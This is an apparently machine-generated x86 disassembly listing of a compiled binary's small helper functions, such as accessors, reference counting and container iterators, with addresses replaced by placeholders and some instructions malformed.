call sub_41ef4b
push 0x0
push 0x0
call sub_426f77
int3
sub_41f47f
mov eax [ eax + 0x4 ]
retn
sub_41f483
add eax 0x14
retn
sub_41f487
add eax 0x15
retn
sub_41f48b
retn
sub_41f48c
add eax 0x4
retn
sub_41f490
add eax 0x8
retn
sub_41f494
retn 0x4
sub_41f497
xor eax eax
inc eax
jmp sub_420eab
sub_41f49f
xor eax eax
cmp [ ecx + 0x4 ] eax
sete al
retn
sub_41f4a8
xor eax eax
test [ rw-data ] 0x1
jne r-xdata
cmp [ ecx ] eax
mov eax rw-data
jbe r-xdata
or [ rw-data ] 0x1
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ ecx + 0x4 ]
sub_41f517
cmp [ esi ] 0x0
jne r-xdata
lea eax [ esi + 0x4 ]
retn
push 0x276
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41f561
mov [ eax ] 0x0
retn 0x4
sub_41f593
mov [ eax ] 0x0
retn 0x4
sub_41f640
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0x9c
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41f65f
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_41f667
and [ eax ] 0x0
retn
sub_41f6a0
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
j_sub_41f904
jmp sub_41f904
sub_41f6b3
mov [ eax ] ecx
retn
sub_41f6b6
mov ecx [ eax ]
mov [ esi ] ecx
call sub_41fa8c
mov eax esi
retn
sub_41f6c2
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_41f6cc
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_41f6f9
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov cl [ ecx + 0x8 ]
mov [ eax + 0x8 ] cl
retn
sub_41f70a
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
sub_41f715
retn
sub_41f7e8
mov eax [ eax + 0x4 ]
add eax 0x8
retn
sub_41f7ef
mov eax [ eax + 0x4 ]
add eax 0x4
retn
sub_41f83b
add eax 0xc
retn
sub_41f83f
jmp r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov eax ecx
retn
sub_41f84d
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov eax ecx
retn
sub_41f85a
retn 0x4
sub_41f85d
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] al
mov eax rw-data
retn
sub_41f874
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
sub_41f87f
mov al [ eax ]
retn
sub_41f882
lea eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov [ ecx ] 0x1
retn
mov edx [ edx ]
mov [ eax ] edx
sub_41f891
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_41f899
add eax 0x4
retn
sub_41f89d
add eax 0x4
retn
sub_41f8a1
mov al [ eax ]
retn
sub_41f8c1
mov edx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x8 ] edx
mov al [ eax + 0x8 ]
mov [ ecx + 0xc ] al
retn 0x4
sub_41f8d5
add eax 0x4
retn
sub_41f8d9
add eax 0x4
retn
sub_41f8dd
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_41f8e3
mov [ eax ] ecx
retn
sub_41f8e6
mov ecx [ eax ]
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41f8f0
mov edx [ ecx ]
push esi
mov esi [ eax ]
mov [ ecx ] esi
mov [ eax ] edx
pop esi
retn
sub_41f8fb
push ebp
mov ebp esp
pop ebp
jmp sub_424fc7
sub_41f93f
mov [ eax ] ecx
retn
sub_41f942
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_41fa8c
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41f954
mov eax [ eax ]
retn
sub_41f957
mov eax [ eax ]
add eax 0x8
retn
sub_41f95d
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_41f965
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov cl [ ecx + 0x8 ]
mov [ eax + 0x8 ] cl
retn
sub_41f976
push [ esi ]
call sub_424fc7
push esi
call sub_424fc7
pop ecx
pop ecx
mov eax esi
retn
sub_41f988
mov eax [ eax + 0x8 ]
retn
sub_41f9fa
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
call sub_41f770
push 0x0
push 0x0
call sub_426f77
int3
sub_41fa23
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
sub_41fa2e
add eax 0x4
retn
sub_41fa32
add eax 0x4
retn
sub_41fa36
add eax 0x4
retn
sub_41fa3a
retn 0x4
sub_41fa3d
retn 0x4
sub_41fa40
retn
sub_41fa41
add eax 0x4
retn
sub_41fa45
add eax 0x4
retn
sub_41fa49
add eax 0x4
retn
sub_41fa4d
retn 0x4
sub_41fa50
retn 0x4
sub_41fa53
retn
sub_41fa80
push [ eax ]
call sub_424fc7
pop ecx
retn
sub_41fa89
mov [ eax ] ecx
retn
sub_41fac2
mov [ eax ] ecx
retn
sub_41fac5
retn
sub_41fac6
retn
sub_41fac7
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov eax rw-data
retn
sub_41fadb
retn 0x4
sub_41fade
retn
sub_41fadf
retn 0x4
sub_41fae2
retn
sub_41fae3
and [ eax ] 0x0
retn
sub_41fb18
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41fb2d
retn
sub_41fb2e
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41fb43
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41fb58
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41fb6d
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41fb82
retn
sub_41fb83
retn
sub_41fc12
mov edx [ eax + 0x8 ]
mov [ ecx + 0x38 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0x3c ] eax
and [ eax ] 0x0
retn
sub_41fcd1
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_421f9e
pop ecx
pop ecx
leave
retn
sub_41fce4
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_42051f
xor eax eax
retn
sub_420599
retn
sub_42059a
mov [ eax ] ecx
retn
sub_42059d
push ebp
mov ebp esp
mov ecx [ eax + 0x204 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax al
call sub_411fdc
pop ebp
retn 0x8
sub_4205ba
movzx eax al
call sub_411fdc
retn 0x4
sub_4209db
retn
sub_420a34
retn
sub_420a7a
retn
sub_420ad3
retn
sub_420b1c
retn
sub_420b62
retn
sub_420b63
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_420b92
retn
sub_420bd5
retn
sub_420bd6
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_420c02
retn
sub_420c45
retn
sub_420c46
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_420c75
retn
sub_420ccb
retn
sub_420d11
retn
sub_420d6a
retn
sub_420db0
retn
sub_420e0c
retn
sub_420e34
push ebp
mov ebp esp
pop ebp
jmp sub_422e2d
sub_420e3d
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_420e47
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_420e4e
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
j_sub_4219fb
jmp sub_4219fb
sub_420e66
mov eax [ eax ]
add eax 0x8
retn
sub_420e6c
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_420e74
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_422e6a
pop ecx
pop ecx
leave
retn
sub_420e87
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4234eb
add esp 0xc
pop ebp
retn 0x8
sub_420e9f
mov edx [ ecx ]
cmp edx [ eax ]
jb r-xdata
retn
mov eax ecx
sub_420ea8
retn
sub_420ea9
retn
sub_420eaa
retn
sub_420eed
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42354a
add esp 0xc
pop ebp
retn
sub_420f03
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_420f0d
xor ecx ecx
inc ecx
[ eax ] ecx
retn
sub_420f15
mov eax [ eax ]
add eax 0x8
retn
sub_420f1b
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_420f42
xor eax eax
inc eax
call sub_420eab
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0x14 ] 0x0
retn
sub_420f62
retn
sub_420f63
add eax 0x34
retn
sub_420f67
mov ecx [ edx + 0x4 ]
xor eax eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov ecx [ ecx + 0x4 ]
inc eax
retn
sub_420fb3
mov eax [ eax ]
retn
sub_420fb6
add [ eax ] 0x2
retn
sub_420fba
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_420fc4
mov eax [ eax ]
retn
sub_420fc7
mov eax [ eax ]
retn
sub_420fca
mov eax [ eax ]
retn
sub_420fcd
mov eax [ eax ]
retn
sub_420fd0
mov eax [ eax ]
retn
sub_420fd3
mov edx [ ecx + 0x20 ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ ecx + 0x28 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_420feb
mov edx [ ecx + 0x20 ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ ecx + 0x28 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_421003
mov edx [ ecx + 0x20 ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ ecx + 0x28 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42101b
mov edx [ ecx + 0x20 ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ ecx + 0x28 ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_421033
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42104b
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_421063
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42107b
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_421093
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_4210ab
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_4210c3
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_4210db
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_4210f3
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42110b
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_421123
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_42113b
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_421153
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_421172
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_421191
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4211b0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4211cf
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4211ee
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_42120d
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_42122c
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_42124b
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_42126a
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_421289
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4212a8
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4212c7
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4212e6
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_421305
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_421324
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_421362
mov eax [ eax ]
add eax 0x8
retn
sub_421368
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_421370
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_421377
mov eax [ eax ]
add eax 0x8
retn
sub_42137d
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_4213e1
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x38 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_421414
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_421e20
pop ebp
retn 0x8
sub_42142c
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_421441
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4214ae
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x38 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4214e1
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_421e50
pop ebp
retn 0x8
sub_4214f9
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_42150e
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_42157b
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x38 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4215ae
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_421e80
pop ebp
retn 0x8
sub_4215c6
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4215db
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_421648
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x38 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_42167b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_421eb0
pop ebp
retn 0x8
sub_421693
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4216a8
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_421716
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x50 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_421749
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_421ee0
pop ebp
retn 0x8
sub_421761
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_421776
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4217e4
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x50 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_421819
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_421f10
pop ebp
retn 0x8
sub_421831
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_421846
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4218b3
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x50 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4218e6
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_421f40
pop ebp
retn 0x8
sub_4218fe
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_421913
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_421980
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x50 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4219b5
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_421f70
pop ebp
retn 0x8
sub_4219cd
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4219e2
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4219f3
xor ecx ecx
inc ecx
[ eax ] ecx
retn
sub_421e13
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_421e1d
retn 0x4
sub_421e4d
retn 0x4
sub_421e7d
retn 0x4
sub_421ead
retn 0x4
sub_421edd
retn 0x4
sub_421f0d
retn 0x4
sub_421f3d
retn 0x4
sub_421f6d
retn 0x4
sub_421f9d
retn
sub_421fc9
retn
sub_421fca
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_421fdf
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_421ff4
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_422009
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_42201e
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_422033
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_422048
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_42205d
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_422072
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_422087
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_42209c
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4220b1
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4220c6
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4220db
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4220f0
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_422105
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_42211a
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov ecx [ ecx + 0x10 ]
add ecx edx
mov [ eax ] ecx
retn
sub_42212e
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ eax ] ecx
retn
mov ecx [ ecx ]
sub_4225da
retn
sub_4225db
push ebp
mov ebp esp
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_41901c
pop ebp
retn 0x4
sub_4226fd
retn
sub_4226fe
push ebp
mov ebp esp
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_4190b3
pop ebp
retn 0x4
sub_42280a
retn
sub_42280b
mov eax [ eax ]
jmp sub_408952
sub_42290b
retn
sub_42290c
mov eax [ eax ]
jmp sub_408952
sub_422a35
retn
sub_422a36
mov eax [ eax ]
jmp sub_408952
sub_422b53
retn
sub_422b54
push ebp
mov ebp esp
push [ ebp + 0x8 ]
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0xc ]
call sub_419664
pop ebp
retn 0x8
sub_422c90
retn
sub_422c91
push ebp
mov ebp esp
push [ ebp + 0x8 ]
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0xc ]
call sub_4196b1
pop ebp
retn 0x8
sub_422da0
retn
sub_422da1
push ebp
mov ebp esp
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_419717
pop ebp
retn 0x4
sub_422e2c
retn
sub_422e2d
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_42313f
dec [ ebp + 0xc ]
add [ ebp + 0x8 ] 0x18
pop ebp
retn
sub_422e4c
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_422e56
retn
sub_422e57
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_422e98
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4234eb
add esp 0xc
leave
retn
sub_422eaf
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42354a
add esp 0xc
leave
retn
sub_422ec6
mov [ eax ] ecx
retn
sub_422ec9
mov eax [ eax ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
retn
sub_422ed3
retn
sub_422ed4
test eax eax
je r-xdata
retn
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_422ee3
retn
sub_422ee4
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov ecx [ ecx + 0x4 ]
inc eax
pop ebp
retn
sub_422f38
retn
sub_422f8e
retn
sub_422fd1
retn
sub_423027
retn
sub_42306a
retn
sub_4230ad
retn
sub_4230ae
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_4230da
